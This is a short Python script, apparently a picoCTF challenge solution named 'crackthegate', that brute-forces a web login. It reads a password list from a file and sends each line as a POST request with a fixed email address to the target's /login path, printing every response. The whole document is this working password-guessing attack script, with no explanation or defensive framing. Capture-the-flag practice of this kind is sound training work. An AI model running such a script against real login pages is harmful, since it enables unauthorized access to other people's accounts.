#usage crackthegate.py <targetURL> <passwordlistpath>


import requests
import sys

EMAIL = "ctf-player@picoctf.org"
URL = sys.argv[1]
PASSWORDLIST = sys.argv[2]

if not URL.endswith("/login"):
    URL += '/login'

with open(PASSWORDLIST) as f:
    for line in f:
        
        data = {'email':EMAIL,'password':line}

        r = requests.post(url=URL,data=data)

        print(r.text)
